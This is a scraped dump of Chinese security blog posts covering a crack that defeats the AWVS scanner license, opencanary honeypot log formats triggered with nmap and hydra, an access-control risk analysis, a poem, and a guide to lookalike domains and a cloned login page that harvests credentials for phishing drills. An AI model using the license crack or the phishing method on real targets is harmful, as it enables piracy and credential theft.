最开始我参考网络上的文章进行破解，发现破解成功。但后来10几天过去了，再登录到awvs里新建了任务，发现扫描失败。通过日志的查看和命令行模式的调试1/home/acunetix/.acunetix_trial/v_190325161/scanner/wvsc /scan http://xxx.com /profile xss /satus /log logfile.txt 发现是license过期了。 参考下t00ls上的帖子《Linux AWVS 12完美破解！！！》:https://www.t00ls.net/viewthread.php?tid=52159 12好多大佬说，破解完成后用段时间就失效了，扫不了了。只要删除wa_data.dat文件即可。亲测可用！！！rm /home/acunetix/.acunetix_trial/data/license/wa_data.dat 在安装完成之后，删除wa_data.bat文件，确实可用。但是10几天之后，awvs会自动再次生成wa_data.bat文件，查看报错提示是license error。 解决：123rm /home/acunetix/.acunetix_trial/data/license/wa_data.dattouch /home/acunetix/.acunetix_trial/data/license/wa_data.datchattr +i /home/acunetix/.acunetix_trial/data/license/wa_data.dat 意思是到期之后将wa_data.dat文件删除，然后手动创建一个wa_data.dat，最后锁定wa_data.dat文件不可写入。 目前awvs破解之后的版本依然可用。 给个awvs的安装包下载地址：https://mega.nz/#F!xOA00CSI!BOvzk-O4SFVlSuep0KAHJw","tags":[{"name":"awvs","slug":"awvs","permalink":"http://pirogue.org/tags/awvs/"},{"name":"漏洞扫描器","slug":"漏洞扫描器","permalink":"http://pirogue.org/tags/漏洞扫描器/"}]},{"title":"opencanary二次开发(1)-日志格式","date":"2019-01-15T12:25:55.000Z","path":"2019/01/15/opencanary_2/","text":"关键代码opencanary/modules目录下为模拟的服务或协议脚本。opencanary/logger.py 为日志生成脚本，我就是在这个文件里直接改了几行代码向web端发送日志，例如post2server函数和log函数；且LoggerBase\b类定义了各种日志类型。 日志格式xmind我将opencanary蜜罐框架分析的日志\b和服务（协议）用xmind进行记录，方便有兴趣的同学进行对照着开发。其中opencanary_web数据库honeypot的OpencanaryLog表的字段也是根据根据日志所包含的所有字段进行设计和开发中随时扩表的。 监听端口当把opencanary配置选项全部开启之后 1234567891011121314151617tcp 0 0 0.0.0.0:2222 0.0.0.0:* LISTEN 12683/pythontcp 0 0 0.0.0.0:8080 0.0.0.0:* LISTEN 12683/pythontcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 12683/pythontcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN 12683/pythontcp 0 0 0.0.0.0:23 0.0.0.0:* LISTEN 12683/pythontcp 0 0 0.0.0.0:1433 0.0.0.0:* LISTEN 12683/pythontcp 0 0 0.0.0.0:3389 0.0.0.0:* LISTEN 12683/pythontcp 0 0 0.0.0.0:8001 0.0.0.0:* LISTEN 12683/pythontcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 12683/pythontcp 0 0 0.0.0.0:9418 0.0.0.0:* LISTEN 12683/pythontcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 12683/pythontcp 0 0 0.0.0.0:6379 0.0.0.0:* LISTEN 12683/pythonudp 0 0 0.0.0.0:57197 0.0.0.0:* 8994/pythonudp 0 0 0.0.0.0:5060 0.0.0.0:* 12683/pythonudp 0 0 0.0.0.0:69 0.0.0.0:* 12683/pythonudp 0 0 0.0.0.0:123 0.0.0.0:* 12683/pythonudp 0 0 0.0.0.0:161 0.0.0.0:* 12683/python \b应用日志HTTP触发方式访问蜜罐http页面 日志格式1&#123;\"dst_host\": \"172.18.200.58\", \"dst_port\": 80, \"local_time\": \"2019-01-07 13:47:45.817940\", \"logdata\": &#123;\"HOSTNAME\": \"172.18.200.58\", \"PASSWORD\": \"admin888\", \"PATH\": \"/index.html\", \"SKIN\": \"nasLogin\", \"USERAGENT\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0\", \"USERNAME\": \"admin\"&#125;, \"logtype\": 3001, \"node_id\": \"opencanary-1\", \"src_host\": \"172.18.205.14\", \"src_port\": 54488&#125; FTP触发方式任意ftp客户端 日志格式1&#123;\"dst_host\": \"172.18.200.58\", \"dst_port\": 21, \"local_time\": \"2019-01-07 13:50:54.264032\", \"logdata\": &#123;\"PASSWORD\": \"admin123\", \"USERNAME\": \"ftpadmin\"&#125;, \"logtype\": 2000, \"node_id\": \"opencanary-1\", \"src_host\": \"172.18.205.14\", \"src_port\": 54573&#125; SSH触发方式任意SSH客户端 日志格式1&#123;\"dst_host\": \"172.18.200.58\", \"dst_port\": 2222, \"local_time\": \"2019-01-07 13:54:27.811101\", \"logdata\": &#123;\"SESSION\": \"3\"&#125;, \"logtype\": 4000, \"node_id\": \"opencanary-1\", \"src_host\": \"172.18.205.14\", \"src_port\": 54639&#125; 1&#123;\"dst_host\": \"172.18.200.58\", \"dst_port\": 2222, \"local_time\": \"2019-01-07 13:54:27.888686\", \"logdata\": &#123;\"LOCALVERSION\": \"SSH-2.0-OpenSSH_5.1p1 Debian-4\", \"REMOTEVERSION\": \"SSH-2.0-OpenSSH_7.0 ZOC_7.16.1\"&#125;, \"logtype\": 4001, \"node_id\": \"opencanary-1\", \"src_host\": \"172.18.205.14\", \"src_port\": 54639&#125; 1&#123;\"dst_host\": \"172.18.200.58\", \"dst_port\": 2222, \"local_time\": \"2019-01-07 13:54:32.444224\", \"logdata\": &#123;\"LOCALVERSION\": \"SSH-2.0-OpenSSH_5.1p1 Debian-4\", \"PASSWORD\": \"root123\", \"REMOTEVERSION\": \"SSH-2.0-OpenSSH_7.0 ZOC_7.16.1\", \"USERNAME\": \"root\"&#125;, \"logtype\": 4002, \"node_id\": \"opencanary-1\", \"src_host\": \"172.18.205.14\", \"src_port\": 54639&#125; Telnet触发方式telnet 172.18.200.58 日志格式1&#123;\"dst_host\": \"172.18.200.58\", \"dst_port\": 23, \"honeycred\": false, \"local_time\": \"2019-01-07 13:56:45.341785\", \"logdata\": &#123;\"PASSWORD\": \"admin888\", \"USERNAME\": \"admin123\"&#125;, \"logtype\": 6001, \"node_id\": \"opencanary-1\", \"src_host\": \"172.18.205.14\", \"src_port\": 54676&#125; MYSQL触发方式mysql -h172.18.200.58 -uroot -p 日志格式1&#123;&quot;dst_host&quot;: &quot;172.18.200.58&quot;, &quot;dst_port&quot;: 3306, &quot;local_time&quot;: &quot;2019-01-07 13:58:25.922257&quot;, &quot;logdata&quot;: &#123;&quot;PASSWORD&quot;: &quot;18076c09615de80ddb2903191b783714918b4c4f&quot;, &quot;USERNAME&quot;: &quot;root&quot;&#125;, &quot;logtype&quot;: 8001, &quot;node_id&quot;: &quot;opencanary-1&quot;, &quot;src_host&quot;: &quot;172.18.220.253&quot;, &quot;src_port&quot;: 46662&#125; git协议触发方式git clone git://192.168.1.7:9418/tmp.git 日志格式1&#123;\"dst_host\": \"192.168.1.7\", \"dst_port\": 9418, \"local_time\": \"2019-01-05 15:38:46.368627\", \"logdata\": &#123;\"HOST\": \"192.168.1.7:9418\", \"REPO\": \"tmp.git\"&#125;, \"logtype\": 16001, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.3\", \"src_port\": 57606&#125; NTP协议触发方式git clone git://192.168.1.7:9418/tmp.git ntp监听的是udp的123端口 日志格式1&#123;\"dst_host\": \"0.0.0.0\", \"dst_port\": 123, \"local_time\": \"2019-01-05 15:58:52.075987\", \"logdata\": &#123;\"NTP CMD\": \"monlist\"&#125;, \"logtype\": 11001, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.6\", \"src_port\": 57886&#125; redis触发方式12345678(env) [root@honeypot Honeypot]# redis-cli -h 192.168.1.7192.168.1.7:6379&gt; keys *(error) NOAUTH Authentication required.192.168.1.7:6379&gt; config get requirepass(error) ERR unknown command 'config'192.168.1.7:6379&gt; auth admin(error) ERR invalid password192.168.1.7:6379&gt; 日志格式1&#123;\"dst_host\": \"192.168.1.7\", \"dst_port\": 6379, \"local_time\": \"2019-01-05 16:05:11.637269\", \"logdata\": &#123;\"ARGS\": \"\", \"CMD\": \"COMMAND\"&#125;, \"logtype\": 17001, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.6\", \"src_port\": 34471&#125; 1&#123;\"dst_host\": \"192.168.1.7\", \"dst_port\": 6379, \"local_time\": \"2019-01-05 16:08:14.786249\", \"logdata\": &#123;\"ARGS\": \"*\", \"CMD\": \"KEYS\"&#125;, \"logtype\": 17001, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.6\", \"src_port\": 34471&#125; 1&#123;\"dst_host\": \"192.168.1.7\", \"dst_port\": 6379, \"local_time\": \"2019-01-05 16:09:36.418200\", \"logdata\": &#123;\"ARGS\": \"get requirepass\", \"CMD\": \"CONFIG\"&#125;, \"logtype\": 17001, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.6\", \"src_port\": 34471&#125; 1&#123;\"dst_host\": \"192.168.1.7\", \"dst_port\": 6379, \"local_time\": \"2019-01-05 16:10:09.802402\", \"logdata\": &#123;\"ARGS\": \"admin\", \"CMD\": \"AUTH\"&#125;, \"logtype\": 17001, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.6\", \"src_port\": 34471&#125; TCP Banner触发方式telnet 192.168.1.6 8001 日志格式1&#123;\"dst_host\": \"192.168.1.6\", \"dst_port\": 8001, \"local_time\": \"2019-01-05 17:18:51.601478\", \"logdata\": &#123;\"BANNER_ID\": \"1\", \"DATA\": \"\", \"FUNCTION\": \"CONNECTION_MADE\"&#125;, \"logtype\": 18002, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.3\", \"src_port\": 59176&#125; 1&#123;\"dst_host\": \"192.168.1.6\", \"dst_port\": 8001, \"local_time\": \"2019-01-05 17:19:12.996007\", \"logdata\": &#123;\"BANNER_ID\": \"1\", \"DATA\": \"\", \"FUNCTION\": \"DATA_RECEIVED\"&#125;, \"logtype\": 18004, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.3\", \"src_port\": 59176&#125; LOG_TCP_BANNER_CONNECTION_MADE = 18001LOG_TCP_BANNER_KEEP_ALIVE_CONNECTION_MADE = 18002LOG_TCP_BANNER_KEEP_ALIVE_SECRET_RECEIVED = 18003LOG_TCP_BANNER_KEEP_ALIVE_DATA_RECEIVED = 18004LOG_TCP_BANNER_DATA_RECEIVED = 18005 VNC触发方式我在mac电脑上用vnc viewer连接 日志格式1&#123;\"dst_host\": \"192.168.1.7\", \"dst_port\": 5000, \"local_time\": \"2019-01-06 08:21:28.951940\", \"logdata\": &#123;\"VNC Client Response\": \"58c00be9ee5b7f3b666771dd2bda9309\", \"VNC Password\": \"&lt;Password was not in the common list&gt;\", \"VNC Server Challenge\": \"953e2dff7e4d3a3114527c282817ce1d\"&#125;, \"logtype\": 12001, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.6\", \"src_port\": 54634&#125; RDP触发方式我在mac电脑上用Microsoft Remote Desktop Beta.app连接 日志格式1&#123;\"dst_host\": \"192.168.1.7\", \"dst_port\": 3389, \"local_time\": \"2019-01-06 08:59:13.890934\", \"logdata\": &#123;\"DOMAIN\": \"\", \"HOSTNAME\": \"HelloHost\", \"PASSWORD\": \"helloword\", \"USERNAME\": \"administrator1\"&#125;, \"logtype\": 14001, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.6\", \"src_port\": 59955&#125; 1&#123;\"dst_host\": \"192.168.1.7\", \"dst_port\": 3389, \"local_time\": \"2019-01-06 08:59:26.868856\", \"logdata\": &#123;\"INPUT\": \"\"&#125;, \"logtype\": 14001, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.6\", \"src_port\": 59955&#125; windows console模式登录的会出现INPUT字段 SIP触发方式hydra -l adminsip -p password 192.168.1.7 sip 日志格式1&#123;\"dst_host\": \"0.0.0.0\", \"dst_port\": 5060, \"local_time\": \"2019-01-06 09:55:12.578148\", \"logdata\": &#123;\"HEADERS\": &#123;\"call-id\": [\"1337@192.168.1.7\"], \"content-length\": [\"0\"], \"cseq\": [\"1 REGISTER\"], \"from\": [\"&lt;sip:adminsip@192.168.1.7&gt;\"], \"to\": [\"&lt;sip:adminsip@192.168.1.7&gt;\"], \"via\": [\"SIP/2.0/UDP 10.0.2.15:46759;received=192.168.1.7\"]&#125;&#125;, \"logtype\": 15001, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.7\", \"src_port\": 46759&#125; SNMP触发方式hydra -p password 192.168.1.7 snmp 日志格式1&#123;\"dst_host\": \"0.0.0.0\", \"dst_port\": 161, \"local_time\": \"2019-01-06 11:17:27.266214\", \"logdata\": &#123;\"COMMUNITY_STRING\": \"password\", \"REQUESTS\": [\"1.3.6.1.2.1.1.1\"]&#125;, \"logtype\": 13001, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.7\", \"src_port\": 47112&#125; NMAPOS探测触发方式sudo nmap -v -Pn -O 192.168.1.7 日志格式1&#123;\"dst_host\": \"192.168.1.7\", \"dst_port\": \"21\", \"local_time\": \"2019-01-06 16:35:24.356080\", \"logdata\": &#123;\"FIN\": \"\", \"ID\": \"37499\", \"IN\": \"eth1\", \"LEN\": \"60\", \"MAC\": \"08:00:27:da:4c:e2:6c:96:cf:dd:ee:bd:08:00\", \"OUT\": \"\", \"PREC\": \"0x00\", \"PROTO\": \"TCP\", \"PSH\": \"\", \"RES\": \"0x00\", \"SYN\": \"\", \"TOS\": \"0x00\", \"TTL\": \"56\", \"URG\": \"\", \"URGP\": \"0\", \"WINDOW\": \"256\"&#125;, \"logtype\": 5002, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.6\", \"src_port\": \"40098\"&#125; SYN探测触发方式sudo nmap -sS 192.168.1.7 日志格式1&#123;\"dst_host\": \"192.168.1.7\", \"dst_port\": \"21\", \"local_time\": \"2019-01-06 16:35:24.190176\", \"logdata\": &#123;\"ID\": \"51918\", \"IN\": \"eth1\", \"LEN\": \"56\", \"MAC\": \"08:00:27:da:4c:e2:6c:96:cf:dd:ee:bd:08:00\", \"OUT\": \"\", \"PREC\": \"0x00\", \"PROTO\": \"TCP\", \"RES\": \"0x00\", \"SYN\": \"\", \"TOS\": \"0x00\", \"TTL\": \"58\", \"URGP\": \"0\", \"WINDOW\": \"512\"&#125;, \"logtype\": 5001, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.6\", \"src_port\": \"40088\"&#125; FIN探测触发方式sudo nmap -sF 192.168.1.7 日志格式1&#123;\"dst_host\": \"192.168.1.7\", \"dst_port\": \"23\", \"local_time\": \"2019-01-06 16:46:18.336954\", \"logdata\": &#123;\"FIN\": \"\", \"ID\": \"29768\", \"IN\": \"eth1\", \"LEN\": \"40\", \"MAC\": \"08:00:27:da:4c:e2:6c:96:cf:dd:ee:bd:08:00\", \"OUT\": \"\", \"PREC\": \"0x00\", \"PROTO\": \"TCP\", \"RES\": \"0x00\", \"TOS\": \"0x00\", \"TTL\": \"59\", \"URGP\": \"0\", \"WINDOW\": \"1024\"&#125;, \"logtype\": 5005, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.6\", \"src_port\": \"35116\"&#125; XmasTree探测触发方式sudo nmap -sX 192.168.1.7 日志格式1&#123;\"dst_host\": \"192.168.1.7\", \"dst_port\": \"139\", \"local_time\": \"2019-01-06 16:48:46.225539\", \"logdata\": &#123;\"FIN\": \"\", \"ID\": \"19984\", \"IN\": \"eth1\", \"LEN\": \"40\", \"MAC\": \"08:00:27:da:4c:e2:6c:96:cf:dd:ee:bd:08:00\", \"OUT\": \"\", \"PREC\": \"0x00\", \"PROTO\": \"TCP\", \"PSH\": \"\", \"RES\": \"0x00\", \"TOS\": \"0x00\", \"TTL\": \"56\", \"URG\": \"\", \"URGP\": \"0\", \"WINDOW\": \"1024\"&#125;, \"logtype\": 5004, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.6\", \"src_port\": \"50913\"&#125; Null探测触发方式sudo nmap -sN 192.168.1.7 日志格式1&#123;\"dst_host\": \"192.168.1.7\", \"dst_port\": \"5060\", \"local_time\": \"2019-01-06 16:51:07.789903\", \"logdata\": &#123;\"ID\": \"26441\", \"IN\": \"eth1\", \"LEN\": \"40\", \"MAC\": \"08:00:27:da:4c:e2:6c:96:cf:dd:ee:bd:08:00\", \"OUT\": \"\", \"PREC\": \"0x00\", \"PROTO\": \"TCP\", \"RES\": \"0x00\", \"TOS\": \"0x00\", \"TTL\": \"50\", \"URGP\": \"0\", \"WINDOW\": \"1024\"&#125;, \"logtype\": 5003, \"node_id\": \"opencanary-1\", \"src_host\": \"192.168.1.6\", \"src_port\": \"58015\"&#125; MSSQLmssql登录sql账户认证SQLPro for MSSQL 日志格式1&#123;\"dst_host\": \"172.18.200.58\", \"dst_port\": 1433, \"local_time\": \"2019-01-07 09:04:58.690137\", \"logdata\": &#123;\"AppName\": \"SQLPro for MSSQL (hankinsoft.com)\", \"CltIntName\": \"DB-Library\", \"Database\": \"test\", \"HostName\": \"Piroguehost\", \"Language\": \"us_english\", \"Password\": \"sa123456\", \"ServerName\": \"172.18.200.58:1433\", \"UserName\": \"sa\"&#125;, \"logtype\": 9001, \"node_id\": \"opencanary-1\", \"src_host\": \"172.18.205.14\", \"src_port\": 64344&#125; mssql登录win身份认证SQLPro for MSSQL 日志格式1&#123;\"dst_host\": \"172.18.200.58\", \"dst_port\": 1433, \"local_time\": \"2019-01-07 09:13:28.669829\", \"logdata\": &#123;\"PASSWORD\": \"\", \"USERNAME\": \"\"&#125;, \"logtype\": 9002, \"node_id\": \"opencanary-1\", \"src_host\": \"172.18.205.14\", \"src_port\": 64499&#125; HTTPPROXY触发方式可以通过浏览器配置一个带有认证的http代理，随便访问一个链接。 日志格式1&#123;\"dst_host\": \"172.18.200.58\", \"dst_port\": 8080, \"local_time\": \"2019-01-07 13:26:47.761297\", \"logdata\": &#123;\"PASSWORD\": \"passsquid\", \"USERNAME\": \"squidadmin\"&#125;, \"logtype\": 7001, \"node_id\": \"opencanary-1\", \"src_host\": \"172.18.205.14\", \"src_port\": 53798&#125; SMB暂时不搞了，因为要依赖系统真实的smb服务。","tags":[{"name":"安全建设","slug":"安全建设","permalink":"http://pirogue.org/tags/安全建设/"},{"name":"甲方安全","slug":"甲方安全","permalink":"http://pirogue.org/tags/甲方安全/"},{"name":"蜜罐","slug":"蜜罐","permalink":"http://pirogue.org/tags/蜜罐/"},{"name":"开源","slug":"开源","permalink":"http://pirogue.org/tags/开源/"},{"name":"opencanary","slug":"opencanary","permalink":"http://pirogue.org/tags/opencanary/"},{"name":"二次开发","slug":"二次开发","permalink":"http://pirogue.org/tags/二次开发/"}]},{"title":"蜜罐正式开源-简单易用-支持16种协议","date":"2019-01-09T11:10:38.000Z","path":"2019/01/09/opencanary_1/","text":"一、web服务端介绍Tornado+Vue+Mysql+APScheduler+Nginx+Supervisor 1. 架构图 2. 功能展示2.1 登录页面 2.2 仪表盘 2.3 主机状态 2.4 攻击列表 2.5 过滤列表 2.6 邮件配置 2.7 白名单ip 二、安装方式可以选择通过脚本自动化安装，也可以选择手工安装。 1. 自动化安装 更省心省力的自动化安装方式 2. 手工安装 让你更了解蜜罐的手工安装方式 3. 一些使用说明 后台和客户端的一些使用说明 三、后台可统计的信息 ftp登录尝试； http访问请求； http登录请求； ssh建立连接； ssh远程版本发送； ssh登录尝试； telnet登录尝试； 全端口(SYN)扫描识别; NMAP OS扫描识别； NMAP NULL扫描识别； NMAP XMAS扫描识别； NMAP FIN扫描识别； mysql登录尝试； git clone请求； ntp monlist请求（默认关闭）； redis命令请求； TCP连接请求； vnc连接请求； rdp协议windows远程登录； snmp扫描； sip请求； mssql登录sql账户认证； mssql登录win身份认证； http代理登录尝试； 四、项目致谢 Thinkst Applied Research 天使用户群和开源贡献者： @Weiho @kafka @Pa5sw0rd @Cotton @Aa.Kay @冷白开 @YongShao @Lemon 五、报告问题在使用过程当中出现任何问题，请点击这里反馈","tags":[{"name":"安全建设","slug":"安全建设","permalink":"http://pirogue.org/tags/安全建设/"},{"name":"甲方安全","slug":"甲方安全","permalink":"http://pirogue.org/tags/甲方安全/"},{"name":"蜜罐","slug":"蜜罐","permalink":"http://pirogue.org/tags/蜜罐/"},{"name":"开源","slug":"开源","permalink":"http://pirogue.org/tags/开源/"},{"name":"opencanary","slug":"opencanary","permalink":"http://pirogue.org/tags/opencanary/"}]},{"title":"前后端分离开发风险浅析","date":"2018-12-17T12:39:48.000Z","path":"2018/12/17/SPA/","text":"1. 什么是前后端分离从职责上区分：负责交互与展示的部分为前端；负责提供数据，处理业务的部分为后端。核心思想是前端html页面通过ajax调用后端的restuful api接口并使用json数据进行交互。 2. 前后端分离架构的优势1）提高工作效率，分工更加明确前端只关注前端的事，后端只关心后端的活，两者开发可以同时进行。在后端还没有提供接口的时候，前端可以先通过Mock的方式模拟接口数据。页面的增加和路由的修改也不必再去麻烦后端，页面模板可以重复使用，开发更加灵活。2）性能提升前端页面可以按需加载，服务器也不需要解析前端页面，在页面交互及用户体验上有所提升。3）降低维护成本页面的调试不再需要后端人员的参与，可以非常快速的定位及发现问题所在，代码重构及可维护性增强。 推荐看一下这篇文章：《前后端分离的思考与实践（一）》，淘宝前端团队从开发角度详细阐释大厂在业务开发中使用前后端分离架构带来的优势，以及为何在前端技术栈要引入Node层。下面我们就基于SPA+Node+JAVA的架构去聊一下前后端分离中可能存在的安全风险。 3. 安全风险分析3.1 技术架构我们从图中可以看到前端工程师负责的静态资源和Node中间层部分开发和后端工程师负责的后端Server业务逻辑的开发。②当用户携带token和请求业务单号applyNo，向Node.js Server请求，③④Node中间层通过thrift协议将token在用户中心验证并解析取出userid，⑤Node.js Server将userid与业务单号applyNo发送给后端，⑥后端根据传入的userid和业务单号applyNo进行业务逻辑，⑦返回数据。 3.2 越权漏洞的发生3.2.1 参数归属校验缺失后端没有校验前端传入的参数是否归属于当前登录用户：因为在第②步中前端的请求暴露在公网中可以任意请求和篡改的，例如我可以请求applyNo=123，也可以请求applyNo=456；虽然前端在第③④步中做了鉴权，并向后端发送了userid，但后端常常没有用到userid（缺少第⑥步中绿色部分），而是在业务逻辑中直接用applyNo进行业务逻辑并返回；这时候攻击者就可以构造大量applyNo请求，越权查询其他人敏感信息。 3.2.2 直接请求后端接口从图中我们可知，攻击者也可以绕过Node.js Server层，直接向后端Server接口进行请求。即使在做了数据归属校验的情况下，如果直接向后端构造大量userid和applyNo请求，遍历两个参数，也可能造成大量敏感信息泄漏，只不过攻击成本高了许多。 3.2.3 前端框架引入的风险在我们发现的漏洞案例中，因为前端框架Vue的路由配置模式“#”，而产生的不可预期的高危漏洞风险。在vue的路由配置中有mode选项，最直观的区别就是在url中 hash 带了一个 # 而history模式是没有#的：hash mode：history mode:而恰恰是因为这个#，导致前端先加载SPA单页应用的index.html可以浏览到后台dashboard等菜单，通过#的锚链接去路由各个前端界面，在浏览单页触发后端接口调用时发现登录态失效才会跳转到首页。攻击者就会通过forexample.com/#/加载单页前端界面，偷窥web管理后台的相关界面和功能，会存在如下图中的情况：原则上前端路由即使可以偷窥后台静态资源，也无法获取后端敏感数据，但在实际情况中后端某些接口疏忽了鉴权(例如上图中的/api/host)导致了敏感信息泄露。我们应在加载index.html单页前进行鉴权，防止类似的事情发生。 4. 解决方案 前端后端一起鉴权，Node层校验登录态，后端校验登录态，同时后端校验数据归属； Vue-router使用“mode: history”模式，前后端一起配合鉴权。1234567891011export default new Router(&#123; mode: 'history', base: 'c', routes: [ &#123; path: '/', // redirect: '/dashboard' redirect: '/dashboard' &#125;, ...... 5. 参考链接Vue-router 中hash模式和history模式的区别前后端分离的思考与实践（一） 6. 致谢感谢团队小伙伴对问题的探讨和开发实践。","tags":[{"name":"安全建设","slug":"安全建设","permalink":"http://pirogue.org/tags/安全建设/"},{"name":"甲方安全","slug":"甲方安全","permalink":"http://pirogue.org/tags/甲方安全/"},{"name":"前后端分离","slug":"前后端分离","permalink":"http://pirogue.org/tags/前后端分离/"},{"name":"开发","slug":"开发","permalink":"http://pirogue.org/tags/开发/"},{"name":"架构","slug":"架构","permalink":"http://pirogue.org/tags/架构/"}]},{"title":"异地恋","date":"2018-12-14T12:14:26.000Z","path":"2018/12/14/异地恋/","text":"偌大的北京， 也只有花梨坎到望京的两点一线。 红酒杯们前呼后拥挤上， 疾驶也追不上的时间。 你有你的年份， 她有她的澄澈， 焦急地待人品鉴。 在雾霭中， 我挥发着心跳， 只想与这里一切道别。 终于， 我盼到每个周五， 火车票上那小小的蓝天。 日子虽慢， 道阻且长， 我极力褪去一身碎玻璃片。 请紧紧的抱着我， 这个回到你身边的小火炉铁。 我会伴你走过春夏秋冬， 迎接我们的小葡萄叶。 ————献给我挚爱的妻子，女本柔弱，为母则刚。","tags":[{"name":"诗歌","slug":"诗歌","permalink":"http://pirogue.org/tags/诗歌/"}]},{"title":"甲方企业安全建设之钓鱼实践的一种姿势","date":"2018-06-26T10:45:00.000Z","path":"2018/06/26/phishing/","text":"效果图 效果图里是某公司的\bsso登录页，Chrome下同时显示的效果也是https; 欢乐的气氛下，其实大部分不是做安全的小伙伴并不知道为什么自己会中招。 原理和步骤\b假设阿里巴巴的公司重要的系统入口是 login.alibaba-inc.com，那你就可以注册一个非常具有迷惑性的域名，例如 alibaba-cin.com。通过cloudflare启用一个login的二级域名，并\b配置https，然后开发一个一模一样的登录页面就可以进行钓鱼实践了。 \b1. 注册域名并修改托管dns首先注册好的钓鱼网站域名： alibaba-cin.com 注册cloudflare账号，并把 alibaba-cin.com 进行网站添加 输入购买的域名，Add Site Next，下一步 选择免费的方案, Confirm Plan 进行0$支付吧，P\burchase 进行dns查询\b等待 cloudflare扫描你的\b域名，发现并没有修改成cloudflare的dns，所以检查失败，这时后点击下方的continue cloudflare给出提示，\b你需要把他给定的两个dns拿到域名商的dns处进行修改 域名商处修改成cloudflare的dns，并确定修改 修改成功等待几分钟就生效了，刷新页面看一下 2. 添加子域名A记录在cf面板dns管理界面，添加A记录 将\bip地址指向你的公网web服务器ip（图中为演示，随意填写的ip） \b3. 配置单向SSL加密（https）选择Crypto设置中的Flexible选项 将下面的\b总是使用https选项打开 将下面的\b自动https重写选项打开 至此我们已经配置好钓鱼的登录\b域名，开启https选项，加强迷惑性。 4. 钓鱼网站编码我们在针对公司进行钓鱼演戏时，并不需要真正开发一套账户体系，只是需要写一个一模一样登录界面，后端接收登录提交的post请求数据即可。 我们浏览器打开需要克隆的目标站，右键源代码把静态html全部复制出来，保存到index.html。 打开页面会发现乱码，很多资源加载不出来 那是因为我们右键源代码复制出来的html里面有很多相对路径，相对路径的资源引用的是目标站的网站路径。我们需要把这种相对路径的资源全部引用目标站的链接，比如/css/bootstrap.min.css改成https://sso.yunxxxxx.com/css/bootstrap.min.css。 \b前端html如何\b将内容post到后端web框架呢？\b 学习一种\bweb框架将目标页面的表单或关键链接替换成我们后端自己的路由； 可能你的目标站的post登录是通过\bajax事件向相对路径post数据，这时你只需要把第4步中改好的html替换我的源代码中的\bindex.html即可。 旧Kali Linux 中有一个社工\b工具setoolkit，我尝试过自动生成的\b目标站钓鱼页面\b\b效果不是太好。这是因为目标站的首页的资源复杂，\b自动生成钓鱼网站的工具比较难实现完美的克隆并与服务器端交互。所以需要自己有一些coding的能力。 12345678910111213application.py - 网站配置文件url.py - 网站\b\b路由规则handlers/login.py - 登录接收数据的逻辑server.py - 网站\b启动文件，启动端口就在这个文件的21行修改templates/index.html - 模板文件，该文件是需要你重点替换和修改的\b静态页fish.txt - 接收到的登录用户名和密码的本地文件logs - 日志目录 注意事项和有意思的事情 钓鱼一定要跟公司的上层领导做好沟通，并取得同意支持，不要任性，可能…会被xx。 如果你\b注册的域名足够巧妙，会取得意想不到的成果：举个例子，当时我注册了一个前公司钓鱼网站的域名，\b搭建在公网上，并没有做任何事情，神奇的事情发生了。\b一个周内，我并没有宣传，也没有向外散播，好几个公司同事\b自投罗网。分析发现，因为注册的域名在手机或电脑上很容易敲错其中的一个字母，比如yun，敲成yum，而且频率较高的部门比较固定为某一类。为了避免不必要的误会，我已经将钓鱼网站域名免费转给了前公司安全的小伙伴。 这招应该对大厂比较管用，员工的基数大，躺着收密码，但要向官方问清楚是否可以采取钓鱼的方式进行； 源码中的index.html我已经把前公司资源的链接换成了不存在的地址，\b打开后会乱码，因为并不想让前公司当成靶子。 不要乱搞，你应该购买域名隐私保护。 有喜欢挖洞的小伙伴经常找不到https的xss平台，用cloudflare\b来搭建自己的https\b xss平台吧，我已经试过\b了。 微信公众号内没有内容，关注与我在后台进行交流： \b使用方法Git: https://github.com/p1r06u3/phishing 一个python依赖库： 1pip install tornado 一行命令： 12345python server.py或者后台运行nohup python server.py &amp;","tags":[{"name":"安全建设","slug":"安全建设","permalink":"http://pirogue.org/tags/安全建设/"},{"name":"甲方安全","slug":"甲方安全","permalink":"http://pirogue.org/tags/甲方安全/"},{"name":"Phishing","slug":"Phishing","permalink":"http://pirogue.org/tags/Phishing/"},{"name":"钓鱼","slug":"钓鱼","permalink":"http://pirogue.org/tags/钓鱼/"}]},{"title":"驭龙hids入侵检测功能初探","date":"2018-04-20T08:37:16.000Z","path":"2018/04/20/yulong-hids/","text":"一、进程实时监控通过hook技术在windows和Linux操作系统的ring0级别进行监控进程和命令执行。 Windows： NT式驱动服务开机自启动：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services net start pro 二、网络链接实时监控通过pcap(gopcap)进行对网络链接进行实时抓包。 Windows：装WinPcap Linux：装libpcap 三、文件操作实时监控通过inotify（fsnotify）监控磁盘文件变化。 四、ES索引类型字段索引：monitor2018_04 类型：connection、file、loginlog、process 字段：data.action、data.command、data.dir、data.hash、data.hostname、data.info、data.local、data.name、data.parentname、data.path、data.pid、data.ppid、data.protocol、data.remote、data.status、data.user、data.username、ip、time 举例： _index _type _id _score ip data.remote data.status data.username time data.dir data.local data.name data.pid data.protocol data.action data.hash data.path data.user data.command data.info data.parentname data.ppid monitor2018_04 